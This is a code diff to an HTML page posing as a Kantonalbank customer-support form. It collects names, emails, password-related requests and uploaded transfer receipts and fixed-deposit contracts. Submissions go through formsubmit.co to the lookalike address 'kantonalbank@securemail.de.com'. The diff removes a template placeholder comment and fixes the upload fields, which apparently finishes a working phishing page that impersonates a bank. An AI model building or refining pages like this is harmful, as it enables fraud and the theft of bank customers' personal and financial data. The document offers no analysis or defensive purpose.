@@ -17,19 +17,18 @@
 
     header {
       background-color: white;
-      padding: 20px;
-      display: flex;
-      align-items: center;
+      padding: 40px 20px 20px;
+      text-align: center;
       border-bottom: 1px solid #e0e0e0;
     }
 
     .logo {
-      height: 40px;
-      margin-right: 20px;
+      height: 50px;
+      margin-bottom: 10px;
     }
 
     .header-title {
-      font-size: 24px;
+      font-size: 26px;
       font-weight: 700;
     }
 
@@ -83,17 +82,17 @@
       background-color: #d32f2f;
     }
 
-    #file-upload-container {
+    .file-upload {
       display: none;
     }
 
     @media (max-width: 600px) {
       .header-title {
-        font-size: 20px;
+        font-size: 22px;
       }
 
       .logo {
-        height: 32px;
+        height: 40px;
       }
     }
   </style>
@@ -107,7 +106,6 @@
 
   <main>
     <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
-      <!-- Replace with your email above -->
 
       <label for="name">Ihr Name</label>
       <input type="text" id="name" name="Name" required>
@@ -116,25 +114,25 @@
       <input type="email" id="email" name="Email" required>
 
       <label for="anliegen">Anliegen</label>
-      <select id="anliegen" name="Anliegen" required onchange="toggleFileUpload(this)">
+      <select id="anliegen" name="Anliegen" required onchange="toggleFileUpload(this.value)">
         <option value="">Bitte wählen</option>
         <option value="Passwort vergessen">Passwort vergessen</option>
         <option value="Passwort ändern">Passwort ändern</option>
         <option value="Dispositionsanfrage">Dispositionsanfrage</option>
         <option value="Technisches Problem">Technisches Problem</option>
-        <option value="Überweisungsbeleg auswählen">Überweisungsquittung</option>
-        <option value="Überweisungsbeleg auswählen">Festgeldvertrag</option>
+        <option value="Überweisungsquittung">Überweisungsquittung</option>
+        <option value="Festgeldvertrag">Festgeldvertrag</option>
         <option value="Sonstiges Thema">Sonstiges Thema</option>
       </select>
 
-      <div id="file-upload-container">
-        <label for="beleg">Überweisungsquittung</label>
-        <input type="file" id="beleg" name="Beleg" accept=".pdf,.jpg,.jpeg,.png" />
+      <div id="upload-quittung" class="file-upload">
+        <label for="beleg1">Überweisungsquittung hochladen</label>
+        <input type="file" id="beleg1" name="Überweisungsquittung" accept=".pdf,.jpg,.jpeg,.png" />
       </div>
 
-      <div id="file-upload-container">
-        <label for="beleg">Festgeldvertrag</label>
-        <input type="file" id="beleg" name="Beleg" accept=".pdf,.jpg,.jpeg,.png" />
+      <div id="upload-vertrag" class="file-upload">
+        <label for="beleg2">Festgeldvertrag hochladen</label>
+        <input type="file" id="beleg2" name="Festgeldvertrag" accept=".pdf,.jpg,.jpeg,.png" />
       </div>
 
       <label for="nachricht">Nachricht</label>
@@ -145,13 +143,9 @@
   </main>
 
   <script>
-    function toggleFileUpload(selectElement) {
-      const fileContainer = document.getElementById('file-upload-container');
-      if (selectElement.value === 'Überweisungsbeleg auswählen') {
-        fileContainer.style.display = 'block';
-      } else {
-        fileContainer.style.display = 'none';
-      }
+    function toggleFileUpload(value) {
+      document.getElementById('upload-quittung').style.display = value === 'Überweisungsquittung' ? 'block' : 'none';
+      document.getElementById('upload-vertrag').style.display = value === 'Festgeldvertrag' ? 'block' : 'none';
     }
   </script>
 
